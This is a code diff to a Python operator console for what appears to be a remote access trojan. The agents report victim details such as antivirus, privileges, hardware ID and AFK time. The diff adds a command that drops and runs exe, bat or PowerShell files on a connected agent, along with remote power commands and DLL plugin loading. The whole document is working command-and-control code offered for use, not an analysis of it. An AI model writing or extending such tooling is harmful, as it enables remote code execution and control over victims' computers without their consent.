@@ -4,10 +4,22 @@ import os
 import socket
 
 FIELDS = [
-    "Country", "Nickname", "Tag", "UserName", "Version", "Privileges",
-    "OS", "GPU", "CPU", "RAM", "AntiVirus", "Uptime", "AFKTime",
+    "Country", "Nickname", "Tag", "User", "Version", "Privileges",
+    "OS", "GPU", "CPU", "RAM", "AntiVirus", "Uptime", "AFK",
     "Ping", "HWID", "Fingerprint",
 ]
+
+HELP_TEXT = """Commands:
+  close / exit / quit        Disconnect the agent
+  reconnect                  Reconnect the agent
+  sleep / hibernate          Power commands
+  restart / shutdown         Power commands
+  load:<path>                Load a plugin DLL
+  unload:<id>                Unload a loaded plugin
+  event:<name>               Fire a plugin event
+  execute:<ext>:<path>       Drop and run a file on the agent
+                             ext: exe | bat | ps1
+  <path>                     Shorthand for load:<path>"""
 
 def read_line(s):
     b = bytearray()
@@ -40,13 +52,18 @@ def wait_result(s):
         if line.startswith("ACK:") or line.startswith("ERR:"):
             return line
 
-# Build a CMD:PLUGIN:<id>:<base64> line from a local DLL file.
 def plugin_cmd(path):
     with open(path, "rb") as f:
         data = f.read()
     stem = os.path.splitext(os.path.basename(path))[0]
     b64 = base64.b64encode(data).decode()
     return f"CMD:PLUGIN:{stem}:{b64}"
+
+def execute_cmd(ext, path):
+    with open(path, "rb") as f:
+        data = f.read()
+    b64 = base64.b64encode(data).decode()
+    return f"CMD:EXECUTE:{ext.lower()}:{b64}"
 
 def main():
     ap = argparse.ArgumentParser()
@@ -85,21 +102,40 @@ def main():
                     return
                 if not cmd:
                     continue
-                if cmd.lower() in {"close", "exit", "quit"}:
+                lc = cmd.lower()
+                if lc == "--help":
+                    print(HELP_TEXT)
+                    continue
+                if lc in {"close", "exit", "quit"}:
                     conn.sendall(b"CMD:CLOSE\n")
-                elif cmd.lower().startswith("unload:"):
+                elif lc in {"reconnect", "sleep", "hibernate", "restart", "shutdown"}:
+                    conn.sendall((f"CMD:{lc.upper()}\n").encode())
+                elif lc.startswith("unload:"):
                     conn.sendall((f"CMD:UNLOAD:{cmd.split(':', 1)[1].strip()}\n").encode())
-                elif cmd.lower().startswith("event:"):
+                elif lc.startswith("event:"):
                     conn.sendall((f"CMD:PLUGIN_EVENT:{cmd.split(':', 1)[1].strip()}\n").encode())
-                elif cmd.lower().startswith("load:"):
+                elif lc.startswith("load:"):
                     path = cmd.split(":", 1)[1].strip()
                     try:
                         conn.sendall((plugin_cmd(path) + "\n").encode())
                     except OSError as e:
                         print(f"error: {e}")
                         continue
+                elif lc.startswith("execute:"):
+                    rest = cmd.split(":", 2)
+                    if len(rest) < 3:
+                        print("usage: execute:<ext>:<path>")
+                        continue
+                    ext, path = rest[1].strip(), rest[2].strip()
+                    if ext.lower() not in {"exe", "bat", "ps1"}:
+                        print("error: ext must be exe, bat, or ps1")
+                        continue
+                    try:
+                        conn.sendall((execute_cmd(ext, path) + "\n").encode())
+                    except OSError as e:
+                        print(f"error: {e}")
+                        continue
                 else:
-                    # treat bare path as a load
                     try:
                         conn.sendall((plugin_cmd(cmd) + "\n").encode())
                     except OSError as e:
@@ -107,7 +143,7 @@ def main():
                         continue
                 if not wait_result(conn):
                     return
-                if cmd.lower() in {"close", "exit", "quit"}:
+                if lc in {"close", "exit", "quit"}:
                     return
 
 if __name__ == "__main__":
